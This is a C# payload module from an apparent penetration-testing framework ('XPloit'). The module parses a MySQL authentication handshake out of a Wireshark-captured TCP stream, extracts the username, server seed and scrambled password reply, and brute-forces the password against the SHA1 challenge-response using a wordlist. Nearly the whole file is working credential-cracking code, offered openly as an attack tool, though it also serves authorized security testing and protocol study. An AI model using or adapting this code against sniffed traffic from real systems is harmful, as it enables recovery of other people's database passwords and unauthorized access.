using Auxiliary.Local;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Core.Enums;
using XPloit.Core.Sniffer.Streams;

namespace Payloads.Local.BruteForce
{
    public class BruteForceMySQLWireshark : Payload, WordListBruteForce.ICheckPassword
    {
        Encoding _Codec = Encoding.Default;

        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Crack MySql sniffed with WireShark Credentials"; } }
        public override Reference[] References
        {
            get
            {
                return new Reference[]
                {
                    new Reference(EReferenceType.URL, "https://github.com/twitter/mysql/blob/master/sql/password.c"),
                    new Reference(EReferenceType.TEXT,
@"The new authentication is performed in following manner:
  SERVER:  public_seed=create_random_string()
           send(public_seed)
  CLIENT:  recv(public_seed)
           hash_stage1=sha1('password')
           hash_stage2=sha1(hash_stage1)
           reply=xor(hash_stage1, sha1(public_seed,hash_stage2)
           // this three steps are done in scramble() 
           send(reply)
     
  SERVER:  recv(reply)
           hash_stage1=xor(reply, sha1(public_seed,hash_stage2))
           candidate_hash2=sha1(hash_stage1)
           check(candidate_hash2==hash_stage2)
           // this three steps are done in check_scramble()")

                };
            }
        }
        #endregion

        #region Properties
        [RequireExists]
        [ConfigurableProperty(Description = "WireShark TCPStream file")]
        public FileInfo TCPStreamFile { get; set; }
        #endregion


        byte[] bseed = null, bhash = null;

        public bool CheckPassword(string password)
        {
            byte[] current = _Codec.GetBytes(password);

            byte[] input = new byte[40], firstHash, finalHash;
            using (SHA1Managed shap = new SHA1Managed())
            {
                firstHash = shap.ComputeHash(current, 0, current.Length);
                byte[] secondHash = shap.ComputeHash(firstHash, 0, 20);

                Array.Copy(bseed, 0, input, 0, 20);
                Array.Copy(secondHash, 0, input, 20, 20);

                finalHash = shap.ComputeHash(input, 0, 40);
            }

            for (int i = 0; i < 20; i++)
            {
                if ((byte)(finalHash[i] ^ firstHash[i]) != bhash[i])
                    return false;
                //if ((finalHash[i] ^ firstHash[i]) != ihash[i]) return false;
            }
            return true;
        }

        public bool PreRun()
        {
            string DBUser = null;
            string Hash = null;
            string Seed = null;

            TcpStream dump = TcpStream.FromFile(TCPStreamFile.FullName);
            if (dump.Count < 2) return false;
            crack(dump[0].Data, dump[1].Data, out Hash, out Seed, out DBUser);

            if (!string.IsNullOrEmpty(DBUser))
                WriteInfo("User found", DBUser, ConsoleColor.Green);

            string _sh = HexToString(Hash, true);

            byte[] bhash_all = _Codec.GetBytes(_sh);
            if (bhash_all.Length != 21) return false;

            string _seed = HexToString(Seed, true);
            bseed = _Codec.GetBytes(_seed);
            bhash = new byte[bhash_all.Length - 1];
            Array.Copy(bhash_all, 1, bhash, 0, bhash.Length);

            return true;
        }
        public void PostRun() { }

        public void crack(byte[] receive, byte[] send, out string Hash, out string Seed, out string DBUser)
        {
            Hash = ""; Seed = ""; DBUser = "";
            if (receive == null) return;
            if (send == null) return;

            try
            {
                MemoryStream ms = new MemoryStream(receive);
                MySqlStream stream = new MySqlStream(ms, _Codec);

                // read off the welcome packet and parse out it's values
                stream.OpenPacket();
                int protocol = stream.ReadByte();
                string versionString = stream.ReadString();
                DBVersion version = DBVersion.Parse(versionString);
                int threadId = stream.ReadInteger(4);
                string encryptionSeed = stream.ReadString();

                int serverCaps = 0;
                if (stream.HasMoreData) serverCaps = stream.ReadInteger(2);
                if (version.isAtLeast(4, 1, 1))
                {
                    /* New protocol with 16 bytes to describe server characteristics */
                    int serverCharSetIndex = stream.ReadInteger(1);

                    int serverStatus = stream.ReadInteger(2);
                    stream.SkipBytes(13);
                    string seedPart2 = stream.ReadString();
                    encryptionSeed += seedPart2;
                }
                stream.Close();
                ms.Close();
                ms.Dispose();

                if (version.isAtLeast(4, 1, 1))
                {
                    string msg = _Codec.GetString(send);
                    int i = msg.IndexOf("\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
                    if (i != -1)
                    {
                        string user = msg.Remove(0, i + 23);
                        i = user.IndexOf('\0');
                        string hash1 = user.Remove(0, i + 1);
                        if (hash1 == "\0") hash1 = "";
                        user = user.Substring(0, i);
                        //CLIENT:  recv(public_seed)
                        //         hash_stage1=sha1("password")
                        //         hash_stage2=sha1(hash_stage1)
                        //         reply=xor(hash_stage1, sha1(public_seed,hash_stage2)
                        //         send(reply)
                        //SERVER:  recv(reply)
                        //         hash_stage1=xor(reply, sha1(public_seed,hash_stage2))
                        //         candidate_hash2=sha1(hash_stage1)
                        //         check(candidate_hash2==hash_stage2)                            
                        Seed = StringToHex(encryptionSeed, true);
                        Hash = StringToHex(hash1.Substring(0, 21), true);
                        DBUser = user;
                    }
                }
                else
                {
                    throw (new Exception("MYSQL ERROR VERSION INCOMPATIBLE, MUST BE >4.1.1"));
                }
            }
            catch { }
        }

        static string HexToString(string str, bool separado)
        {
            if (string.IsNullOrEmpty(str)) return "";
            StringBuilder ss = new StringBuilder();
            if (separado)
            {
                foreach (string s in str.Split(':'))
                    ss.Append(System.Convert.ToChar(System.Convert.ToUInt32(s, 16)).ToString());
            }
            else
            {
                if (str.Length % 2 == 0) throw (new Exception("ERROR, CADENA INPAR"));
                for (int x = 0; x < str.Length; x += 2)
                    ss.Append(System.Convert.ToChar(System.Convert.ToUInt32(str.Substring(x, 2), 16)).ToString());
            }
            return ss.ToString();
        }
        static string StringToHex(string str, bool sep_puntos)
        {
            if (string.IsNullOrEmpty(str)) return "";
            StringBuilder s = new StringBuilder();
            bool p = true;
            foreach (char c in str)
            {
                int tmp = c;
                if (sep_puntos && !p) s.Append(":");
                s.Append(String.Format("{0:x2}", (uint)System.Convert.ToUInt32(tmp.ToString())));
                p = false;
            }
            return s.ToString();
        }

        #region MySQL
        struct DBVersion
        {
            private int major;
            private int minor;
            private int build;
            private string srcString;

            public DBVersion(string s, int major, int minor, int build)
            {
                this.major = major;
                this.minor = minor;
                this.build = build;
                srcString = s;
            }
            public int Major { get { return major; } }
            public int Minor { get { return minor; } }
            public int Build { get { return build; } }
            public static DBVersion Parse(string versionString)
            {
                int start = 0;
                int index = versionString.IndexOf('.', start);
                if (index == -1) throw new Exception("ERROR");
                string val = versionString.Substring(start, index - start).Trim();
                int major = Convert.ToInt32(val, System.Globalization.NumberFormatInfo.InvariantInfo);

                start = index + 1;
                index = versionString.IndexOf('.', start);
                if (index == -1) throw new Exception("ERROR");
                val = versionString.Substring(start, index - start).Trim();
                int minor = Convert.ToInt32(val, System.Globalization.NumberFormatInfo.InvariantInfo);

                start = index + 1;
                int i = start;
                while (i < versionString.Length && Char.IsDigit(versionString, i))
                    i++;
                val = versionString.Substring(start, i - start).Trim();
                int build = Convert.ToInt32(val, System.Globalization.NumberFormatInfo.InvariantInfo);

                return new DBVersion(versionString, major, minor, build);
            }
            public bool isAtLeast(int majorNum, int minorNum, int buildNum)
            {
                if (major > majorNum) return true;
                if (major == majorNum && minor > minorNum) return true;
                if (major == majorNum && minor == minorNum && build >= buildNum) return true;
                return false;
            }
            public override string ToString() { return srcString; }

        }
        class MySqlStream
        {
            private byte sequenceByte;
            private int peekByte;
            private Encoding encoding;

            private MemoryStream bufferStream;

            private int maxBlockSize;
            private ulong maxPacketSize;

            private Stream inStream;
            private ulong inLength;
            private ulong inPos;

            private Stream outStream;
            private bool isLastPacket;
            private byte[] byteBuffer;

            public MySqlStream(Encoding encoding)
            {
                // we have no idea what the real value is so we start off with the max value
                // The real value will be set in NativeDriver.Configure()
                maxPacketSize = ulong.MaxValue;

                // we default maxBlockSize to MaxValue since we will get the 'real' value in 
                // the authentication handshake and we know that value will not exceed 
                // true maxBlockSize prior to that.
                maxBlockSize = Int32.MaxValue;

                this.encoding = encoding;
                bufferStream = new MemoryStream();
                byteBuffer = new byte[1];
                peekByte = -1;
            }

            public MySqlStream(Stream baseStream, Encoding encoding/*bool compress*/)
                : this(encoding)
            {

                inStream = new BufferedStream(baseStream);
                outStream = new BufferedStream(baseStream);
                //if (compress)
                //{
                //    inStream = new CompressedStream(inStream);
                //    outStream = new CompressedStream(outStream);
                //}
            }

            public void Close()
            {
                inStream.Close();
                // no need to close outStream because closing
                // inStream closes the underlying network stream
                // for us.
            }

            public bool HasMoreData
            {
                get
                {
                    return inLength > 0 &&
                             (inLength == (ulong)maxBlockSize || inPos < inLength);
                }
            }

            #region Packet methods
            /// <summary>
            /// OpenPacket is called by NativeDriver to start reading the next
            /// packet on the stream.
            /// </summary>
            public void OpenPacket()
            {
                if (HasMoreData)
                {
                    SkipBytes((int)(inLength - inPos));
                }
                // make sure we have read all the data from the previous packet
                //Debug.Assert(HasMoreData == false, "HasMoreData is true in OpenPacket");

                LoadPacket();

                int peek = PeekByte();
                if (peek == 0xff)
                {
                    ReadByte();  // read off the 0xff

                    int code = ReadInteger(2);
                    string msg = ReadString();
                    if (msg.StartsWith("#"))
                    {
                        msg.Substring(1, 5);  /* state code */
                        msg = msg.Substring(6);
                    }
                    throw new Exception(msg);
                }
                isLastPacket = (peek == 0xfe && (inLength < 9));
            }

            /// <summary>
            /// LoadPacket loads up and decodes the header of the incoming packet.
            /// </summary>
            public void LoadPacket()
            {
                int b1 = inStream.ReadByte();
                int b2 = inStream.ReadByte();
                int b3 = inStream.ReadByte();
                int seqByte = inStream.ReadByte();

                if (b1 == -1 || b2 == -1 || b3 == -1 || seqByte == -1) throw new Exception("ERROR");

                sequenceByte = (byte)++seqByte;
                inLength = (ulong)(b1 + (b2 << 8) + (b3 << 16));

                inPos = 0;
            }
            #endregion

            #region Byte methods
            public void SkipBytes(int len)
            {
                while (len-- > 0)
                    ReadByte();
            }
            /// <summary>
            /// Reads the next byte from the incoming stream
            /// </summary>
            /// <returns></returns>
            public int ReadByte()
            {
                int b;
                if (peekByte != -1)
                {
                    b = PeekByte();
                    peekByte = -1;
                    inPos++;   // we only do this here since Read will also do it
                }
                else
                {
                    // we read the byte this way because we might cross over a 
                    // multipacket boundary
                    int cnt = Read(byteBuffer, 0, 1);
                    if (cnt <= 0)
                        return -1;
                    b = byteBuffer[0];
                }
                return b;
            }

            /// <summary>
            /// Reads a block of bytes from the input stream into the given buffer.
            /// </summary>
            /// <returns>The number of bytes read.</returns>
            public int Read(byte[] buffer, int offset, int count)
            {
                // we use asserts here because this is internal code
                // and we should be calling it correctly in all cases
                //Debug.Assert(buffer != null);
                //Debug.Assert(offset >= 0 &&
                //    (offset < buffer.Length || (offset == 0 && buffer.Length == 0)));
                //Debug.Assert(count >= 0);
                //Debug.Assert((offset + count) <= buffer.Length);

                int totalRead = 0;

                while (count > 0)
                {
                    // if we have peeked at a byte, then read it off first.
                    if (peekByte != -1)
                    {
                        buffer[offset++] = (byte)ReadByte();
                        count--;
                        totalRead++;
                        continue;
                    }

                    // check if we are done reading the current packet
                    if (inPos == inLength)
                    {
                        // if yes and this block is not max size, then we are done
                        if (inLength < (ulong)maxBlockSize)
                            return 0;

                        // the current block is maxBlockSize so we need to read
                        // in another block to continue
                        LoadPacket();
                    }

                    int lenToRead = Math.Min(count, (int)(inLength - inPos));
                    int read = inStream.Read(buffer, offset, lenToRead);

                    // we don't throw an exception here even though this probably
                    // indicates a broken connection.  We leave that to the 
                    // caller.
                    if (read == 0)
                        break;

                    count -= read;
                    offset += read;
                    totalRead += read;
                    inPos += (ulong)read;
                }

                return totalRead;
            }

            /// <summary>
            /// Peek at the next byte off the stream
            /// </summary>
            /// <returns>The next byte off the stream</returns>
            public int PeekByte()
            {
                if (peekByte == -1)
                {
                    peekByte = ReadByte();
                    // ReadByte will advance inPos so we need to back it up since
                    // we are not really reading the byte
                    inPos--;
                }
                return peekByte;
            }

            #endregion

            #region Integer methods
            public ulong ReadLong(int numbytes)
            {
                ulong val = 0;
                int raise = 1;
                for (int x = 0; x < numbytes; x++)
                {
                    int b = ReadByte();
                    val += (ulong)(b * raise);
                    raise *= 256;
                }
                return val;
            }

            public int ReadInteger(int numbytes)
            {
                return (int)ReadLong(numbytes);
            }

            public int ReadPackedInteger()
            {
                byte c = (byte)ReadByte();

                switch (c)
                {
                    case 251: return -1;
                    case 252: return ReadInteger(2);
                    case 253: return ReadInteger(3);
                    case 254: return ReadInteger(4);
                    default: return c;
                }
            }


            #endregion

            #region String methods


            public string ReadLenString()
            {
                long len = ReadPackedInteger();
                return ReadString(len);
            }

            public string ReadString(long length)
            {
                if (length == 0)
                    return String.Empty;
                byte[] buf = new byte[length];
                Read(buf, 0, (int)length);
                return encoding.GetString(buf, 0, buf.Length);
            }

            public string ReadString()
            {
                MemoryStream ms = new MemoryStream();

                int b = ReadByte();
                while (b != 0 && b != -1)
                {
                    ms.WriteByte((byte)b);
                    b = ReadByte();
                }

                return encoding.GetString(ms.GetBuffer(), 0, (int)ms.Length);
            }

            #endregion

        }
        #endregion
    }
}
